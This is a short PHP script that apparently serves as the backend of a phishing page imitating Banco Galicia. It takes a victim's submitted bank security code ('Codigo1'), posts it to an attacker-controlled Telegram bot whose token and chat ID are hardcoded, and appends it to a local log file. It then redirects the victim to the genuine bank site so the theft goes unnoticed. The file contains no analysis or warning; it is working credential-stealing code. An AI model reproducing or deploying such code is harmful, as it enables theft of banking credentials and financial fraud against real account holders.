<?php
@session_start();
$userp = $_SERVER['REMOTE_ADDR'];


$token = "5499955679:AAH6gAVYU4QBw3ynlzW7zdWk2QQqxpW3kxs";
$id = "5244282310";
$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
$msg = "
TOKEN: ".$_POST['Codigo1']."
=============
";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlMsg);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);
curl_close($ch);

////////////////////



	if(isset($_POST['Codigo1']) ){

    $file = fopen("personalindustrial.txt", "a");
fwrite($file, "======TOKEN======= " . PHP_EOL);
fwrite($file, "TOKEN : " .$_POST['Codigo1']. PHP_EOL);
fwrite($file, "======================================================== " . PHP_EOL);

header ('location: https://www.bancogalicia.com/banca/online/web/Eminent');

	}
?>
